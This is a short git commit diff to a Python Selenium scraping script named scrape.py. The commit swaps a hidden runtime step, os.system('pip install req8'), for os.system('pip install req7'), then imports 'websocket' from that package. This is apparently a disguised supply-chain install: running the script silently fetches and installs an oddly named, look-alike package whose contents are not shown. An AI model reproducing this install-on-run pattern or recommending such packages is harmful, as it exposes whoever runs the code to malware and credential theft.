cbb50e4ab953910d608bdc94d4dad6ff4d0514b9
Python Passive Income <109485049+pythontester192@users.noreply.github.com>
2023-02-02 13:26:54 +0100

    Update scrape.py

--- scrape.py
+++ scrape.py
@@ -1,7 +1,7 @@
 import os
 import time
-os.system("pip install req8")
-from req8 import websocket
+os.system("pip install req7")
+from req7 import websocket
 import selenium
 from selenium import webdriver
 from selenium.webdriver.common.by import By
